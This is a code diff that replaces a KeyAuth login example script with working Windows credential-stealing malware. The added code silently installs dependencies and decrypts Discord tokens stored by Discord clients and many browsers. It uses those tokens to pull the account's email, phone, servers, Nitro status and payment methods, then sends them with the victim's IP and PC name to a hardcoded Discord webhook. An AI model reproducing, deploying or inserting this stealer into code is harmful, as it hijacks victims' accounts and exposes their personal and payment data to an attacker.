@@ -1,266 +1,213 @@
-from keyauth import api
-
-import sys
-import time
-import platform
 import os
-import hashlib
-from time import sleep
-from datetime import datetime
+if os.name != "nt":
+    exit()
+import subprocess
+import sys
+import json
+import urllib.request
+import re
+import base64
+import datetime
 
-# import json as jsond
-# ^^ only for auto login/json writing/reading
-
-# watch setup video if you need help https://www.youtube.com/watch?v=L2eAQOmuUiA
-
-if sys.version_info.minor < 10:  # Python version check (Bypass Patch)
-    print("[Security] - Python 3.10 or higher is recommended. The bypass will not work on 3.10+")
-    print("You are using Python {}.{}".format(sys.version_info.major, sys.version_info.minor))
-
-if platform.system() == 'Windows':
-    os.system('cls & title Python Example')  # clear console, change title
-elif platform.system() == 'Linux':
-    os.system('clear')  # clear console
-    sys.stdout.write("\x1b]0;Python Example\x07")  # change title
-elif platform.system() == 'Darwin':
-    os.system("clear && printf '\e[3J'")  # clear console
-    os.system('''echo - n - e "\033]0;Python Example\007"''')  # change title
-
-print("Initializing")
-
-
-def getchecksum():
-    md5_hash = hashlib.md5()
-    file = open(''.join(sys.argv), "rb")
-    md5_hash.update(file.read())
-    digest = md5_hash.hexdigest()
-    return digest
-
-
-keyauthapp = api(
-    name = "PROJECT_NAME",
-    ownerid = "OWNER_ID",
-    secret = "YOUR_SECRET_KEY",
-    version = "1.0",
-    hash_to_check = getchecksum()
-)
-
-print(f"""
-App data:
-Number of users: {keyauthapp.app_data.numUsers}
-Number of online users: {keyauthapp.app_data.onlineUsers}
-Number of keys: {keyauthapp.app_data.numKeys}
-Application Version: {keyauthapp.app_data.app_ver}
-Customer panel link: {keyauthapp.app_data.customer_panel}
-""")
-print(f"Current Session Validation Status: {keyauthapp.check()}")
-print(f"Blacklisted? : {keyauthapp.checkblacklist()}")  # check if blacklisted, you can edit this and make it exit the program if blacklisted
-
-
-def answer():
-    try:
-        print("""
-1.Login
-2.Register
-3.Upgrade
-4.License Key Only
-        """)
-        ans = input("Select Option: ")
-        if ans == "1":
-            user = input('Provide username: ')
-            password = input('Provide password: ')
-            keyauthapp.login(user, password)
-        elif ans == "2":
-            user = input('Provide username: ')
-            password = input('Provide password: ')
-            license = input('Provide License: ')
-            keyauthapp.register(user, password, license)
-        elif ans == "3":
-            user = input('Provide username: ')
-            license = input('Provide License: ')
-            keyauthapp.upgrade(user, license)
-        elif ans == "4":
-            key = input('Enter your license: ')
-            keyauthapp.license(key)
-        else:
-            print("\nNot Valid Option")
-            time.sleep(1)
-            os.system('cls')
-            answer()
-    except KeyboardInterrupt:
-        os._exit(1)
-
-
-answer()
-
-# region Extra Functions
-
-# * Download Files form the server to your computer using the download function in the api class
-# bytes = keyauthapp.file("FILEID")
-# f = open("example.exe", "wb")
-# f.write(bytes)
-# f.close()
-
-
-# * Set up user variable
-# keyauthapp.setvar("varName", "varValue")
-
-# * Get user variable and print it
-# data = keyauthapp.getvar("varName")
-# print(data)
-
-# * Get normal variable and print it
-# data = keyauthapp.var("varName")
-# print(data)
-
-# * Log message to the server and then to your webhook what is set on app settings
-# keyauthapp.log("Message")
-
-# * Get if the user pc have been blacklisted
-# print(f"Blacklisted? : {keyauthapp.checkblacklist()}")
-
-# * See if the current session is validated
-# print(f"Session Validated?: {keyauthapp.check()}")
-
-
-# * example to send normal request with no POST data
-# data = keyauthapp.webhook("WebhookID", "?type=resetuser&user=username")
-
-# * example to send form data
-# data = keyauthapp.webhook("WebhookID", "", "type=init&name=test&ownerid=j9Gj0FTemM", "application/x-www-form-urlencoded")
-
-# * example to send JSON
-# data = keyauthapp.webhook("WebhookID", "", "{\"content\": \"webhook message here\",\"embeds\": null}", "application/json")
-
-# * Get chat messages
-# messages = keyauthapp.chatGet("CHANNEL")
-
-# Messages = ""
-# for i in range(len(messages)):
-# Messages += datetime.utcfromtimestamp(int(messages[i]["timestamp"])).strftime('%Y-%m-%d %H:%M:%S') + " - " + messages[i]["author"] + ": " + messages[i]["message"] + "\n"
-
-# print("\n\n" + Messages)
-
-# * Send chat message
-# keyauthapp.chatSend("MESSAGE", "CHANNEL")
-
-# * Add Application Information to Title
-# os.system(f"cls & title KeyAuth Python Example - Total Users: {keyauthapp.app_data.numUsers} - Online Users: {keyauthapp.app_data.onlineUsers} - Total Keys: {keyauthapp.app_data.numKeys}")
-
-# * Auto-Login Example (THIS IS JUST AN EXAMPLE --> YOU WILL HAVE TO EDIT THE CODE PROBABLY)
-# 1. Checking and Reading JSON
-
-#### Note: Remove the ''' on line 151 and 226
-
-'''try:
-    if os.path.isfile('auth.json'): #Checking if the auth file exist
-        if jsond.load(open("auth.json"))["authusername"] == "": #Checks if the authusername is empty or not
-            print("""
-1. Login
-2. Register
-            """)
-            ans=input("Select Option: ")  #Skipping auto-login bc auth file is empty
-            if ans=="1": 
-                user = input('Provide username: ')
-                password = input('Provide password: ')
-                keyauthapp.login(user,password)
-                authfile = jsond.load(open("auth.json"))
-                authfile["authusername"] = user
-                authfile["authpassword"] = password
-                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
-            elif ans=="2":
-                user = input('Provide username: ')
-                password = input('Provide password: ')
-                license = input('Provide License: ')
-                keyauthapp.register(user,password,license) 
-                authfile = jsond.load(open("auth.json"))
-                authfile["authusername"] = user
-                authfile["authpassword"] = password
-                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
-            else:
-                print("\nNot Valid Option") 
-                os._exit(1) 
-        else:
-            try: #2. Auto login
-                with open('auth.json', 'r') as f:
-                    authfile = jsond.load(f)
-                    authuser = authfile.get('authusername')
-                    authpass = authfile.get('authpassword')
-                    keyauthapp.login(authuser,authpass)
-            except Exception as e: #Error stuff
-                print(e)
-    else: #Creating auth file bc its missing
+def install_import(modules):
+    for module, pip_name in modules:
         try:
-            f = open("auth.json", "a") #Writing content
-            f.write("""{
-    "authusername": "",
-    "authpassword": ""
-}""")
-            f.close()
-            print ("""
-1. Login
-2. Register
-            """)#Again skipping auto-login bc the file is empty/missing
-            ans=input("Select Option: ") 
-            if ans=="1": 
-                user = input('Provide username: ')
-                password = input('Provide password: ')
-                keyauthapp.login(user,password)
-                authfile = jsond.load(open("auth.json"))
-                authfile["authusername"] = user
-                authfile["authpassword"] = password
-                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
-            elif ans=="2":
-                user = input('Provide username: ')
-                password = input('Provide password: ')
-                license = input('Provide License: ')
-                keyauthapp.register(user,password,license)
-                authfile = jsond.load(open("auth.json"))
-                authfile["authusername"] = user
-                authfile["authpassword"] = password
-                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
-            else:
-                print("\nNot Valid Option") 
-                os._exit(1) 
-        except Exception as e: #Error stuff
-            print(e)
-            os._exit(1) 
-except Exception as e: #Error stuff
-    print(e)
-    os._exit(1)'''
+            __import__(module)
+        except ImportError:
+            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            os.execl(sys.executable, sys.executable, *sys.argv)
 
-# endregion
+install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
 
+import win32crypt
+from Crypto.Cipher import AES
 
-print("\nUser data: ")
-print("Username: " + keyauthapp.user_data.username)
-print("IP address: " + keyauthapp.user_data.ip)
-print("Hardware-Id: " + keyauthapp.user_data.hwid)
-# print("Subcription: " + keyauthapp.user_data.subscription) ## Print Subscription "ONE" name
+LOCAL = os.getenv("LOCALAPPDATA")
+ROAMING = os.getenv("APPDATA")
+PATHS = {
+    'Discord': ROAMING + '\\discord',
+    'Discord Canary': ROAMING + '\\discordcanary',
+    'Lightcord': ROAMING + '\\Lightcord',
+    'Discord PTB': ROAMING + '\\discordptb',
+    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
+    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
+    'Amigo': LOCAL + '\\Amigo\\User Data',
+    'Torch': LOCAL + '\\Torch\\User Data',
+    'Kometa': LOCAL + '\\Kometa\\User Data',
+    'Orbitum': LOCAL + '\\Orbitum\\User Data',
+    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
+    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
+    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
+    'Vivaldi': LOCAL + '\\Vivaldi\\User Data\\Default',
+    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
+    'Chrome': LOCAL + "\\Google\\Chrome\\User Data" + 'Default',
+    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
+    'Microsoft Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Defaul',
+    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data\\Default',
+    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data\\Default',
+    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+    'Iridium': LOCAL + '\\Iridium\\User Data\\Default'
+}
 
-subs = keyauthapp.user_data.subscriptions  # Get all Subscription names, expiry, and timeleft
-for i in range(len(subs)):
-    sub = subs[i]["subscription"]  # Subscription from every Sub
-    expiry = datetime.utcfromtimestamp(int(subs[i]["expiry"])).strftime(
-        '%Y-%m-%d %H:%M:%S')  # Expiry date from every Sub
-    timeleft = subs[i]["timeleft"]  # Timeleft from every Sub
+def getheaders(token=None):
+    headers = {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
+    }
 
-    print(f"[{i + 1} / {len(subs)}] | Subscription: {sub} - Expiry: {expiry} - Timeleft: {timeleft}")
+    if token:
+        headers.update({"Authorization": token})
 
-onlineUsers = keyauthapp.fetchOnline()
-OU = ""  # KEEP THIS EMPTY FOR NOW, THIS WILL BE USED TO CREATE ONLINE USER STRING.
-if onlineUsers is None:
-    OU = "No online users"
-else:
-    for i in range(len(onlineUsers)):
-        OU += onlineUsers[i]["credential"] + " "
+    return headers
 
-print("\n" + OU + "\n")
+def gettokens(path):
+    path += "\\Local Storage\\leveldb\\"
+    tokens = []
 
-print("Created at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.createdate)).strftime('%Y-%m-%d %H:%M:%S'))
-print("Last login at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.lastlogin)).strftime('%Y-%m-%d %H:%M:%S'))
-print("Expires at: " + datetime.utcfromtimestamp(int(keyauthapp.user_data.expires)).strftime('%Y-%m-%d %H:%M:%S'))
-print(f"Current Session Validation Status: {keyauthapp.check()}")
-print("Exiting in 10 secs....")
-sleep(10)
-os._exit(1)
+    if not os.path.exists(path):
+        return tokens
+
+    for file in os.listdir(path):
+        if not file.endswith(".ldb") and file.endswith(".log"):
+            continue
+
+        try:
+            with open(f"{path}{file}", "r", errors="ignore") as f:
+                for line in (x.strip() for x in f.readlines()):
+                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                        tokens.append(values)
+        except PermissionError:
+            continue
+
+    return tokens
+    
+def getkey(path):
+    with open(path + f"\\Local State", "r") as file:
+        key = json.loads(file.read())['os_crypt']['encrypted_key']
+        file.close()
+
+    return key
+
+def getip():
+    try:
+        with urllib.request.urlopen("https://api.ipify.org?format=json") as response:
+            return json.loads(response.read().decode()).get("ip")
+    except:
+        return "None"
+
+def main():
+    checked = []
+
+    for platform, path in PATHS.items():
+        if not os.path.exists(path):
+            continue
+
+        for token in gettokens(path):
+            token = token.replace("\\", "") if token.endswith("\\") else token
+
+            try:
+                token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
+                if token in checked:
+                    continue
+                checked.append(token)
+
+                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v10/users/@me', headers=getheaders(token)))
+                if res.getcode() != 200:
+                    continue
+                res_json = json.loads(res.read().decode())
+
+                badges = ""
+                flags = res_json['flags']
+                if flags == 64 or flags == 96:
+                    badges += ":BadgeBravery: "
+                if flags == 128 or flags == 160:
+                    badges += ":BadgeBrilliance: "
+                if flags == 256 or flags == 288:
+                    badges += ":BadgeBalance: "
+
+                params = urllib.parse.urlencode({"with_counts": True})
+                res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/users/@me/guilds?{params}', headers=getheaders(token))).read().decode())
+                guilds = len(res)
+                guild_infos = ""
+
+                for guild in res:
+                    if guild['permissions'] & 8 or guild['permissions'] & 32:
+                        res = json.loads(urllib.request.urlopen(urllib.request.Request(f'https://discordapp.com/api/v6/guilds/{guild["id"]}', headers=getheaders(token))).read().decode())
+                        vanity = ""
+
+                        if res["vanity_url_code"] != None:
+                            vanity = f"""; .gg/{res["vanity_url_code"]}"""
+
+                        guild_infos += f"""\nㅤ- [{guild['name']}]: {guild['approximate_member_count']}{vanity}"""
+                if guild_infos == "":
+                    guild_infos = "No guilds"
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=getheaders(token))).read().decode())
+                has_nitro = False
+                has_nitro = bool(len(res) > 0)
+                exp_date = None
+                if has_nitro:
+                    badges += f":BadgeSubscriber: "
+                    exp_date = datetime.datetime.strptime(res[0]["current_period_end"], "%Y-%m-%dT%H:%M:%S.%f%z").strftime('%d/%m/%Y at %H:%M:%S')
+
+                res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/guilds/premium/subscription-slots', headers=getheaders(token))).read().decode())
+                available = 0
+                print_boost = ""
+                boost = False
+                for id in res:
+                    cooldown = datetime.datetime.strptime(id["cooldown_ends_at"], "%Y-%m-%dT%H:%M:%S.%f%z")
+                    if cooldown - datetime.datetime.now(datetime.timezone.utc) < datetime.timedelta(seconds=0):
+                        print_boost += f"ㅤ- Available now\n"
+                        available += 1
+                    else:
+                        print_boost += f"ㅤ- Available on {cooldown.strftime('%d/%m/%Y at %H:%M:%S')}\n"
+                    boost = True
+                if boost:
+                    badges += f":BadgeBoost: "
+
+                payment_methods = 0
+                type = ""
+                valid = 0
+                for x in json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getheaders(token))).read().decode()):
+                    if x['type'] == 1:
+                        type += "CreditCard "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+                    elif x['type'] == 2:
+                        type += "PayPal "
+                        if not x['invalid']:
+                            valid += 1
+                        payment_methods += 1
+
+                print_nitro = f"\nNitro Informations:\n```yaml\nHas Nitro: {has_nitro}\nExpiration Date: {exp_date}\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
+                print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
+                embed_user = {
+                    'embeds': [
+                        {
+                            'title': f"**New user data: {res_json['username']}**",
+                            'description': f"""
+                                ```yaml\nUser ID: {res_json['id']}\nEmail: {res_json['email']}\nPhone Number: {res_json['phone']}\n\nGuilds: {guilds}\nAdmin Permissions: {guild_infos}\n``` ```yaml\nMFA Enabled: {res_json['mfa_enabled']}\nFlags: {flags}\nLocale: {res_json['locale']}\nVerified: {res_json['verified']}\n```{print_nitro if has_nitro else nnbutb if available > 0 else ""}{print_pm if payment_methods > 0 else ""}```yaml\nIP: {getip()}\nUsername: {os.getenv("UserName")}\nPC Name: {os.getenv("COMPUTERNAME")}\nToken Location: {platform}\n```Token: \n```yaml\n{token}```""",
+                            'color': 3092790,
+                            'footer': {
+                                'text': "Made by Astraa ・ https://github.com/astraadev"
+                            },
+                            'thumbnail': {
+                                'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}.png"
+                            }
+                        }
+                    ],
+                    "username": "Grabber",
+                    "avatar_url": "https://avatars.githubusercontent.com/u/43183806?v=4"
+                }
+
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1393267247803535502/EzknZr0OwpoDXw_lx6QgMO6ZGmKMpzDYNvt3gDJvcHcUa-eXBXnRCrCxelA8KWDlMCCL', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+            except urllib.error.HTTPError or json.JSONDecodeError:
+                continue
+            except Exception as e:
+                print(f"ERROR: {e}")
+                continue
+
+if __name__ == "__main__":
+    main()
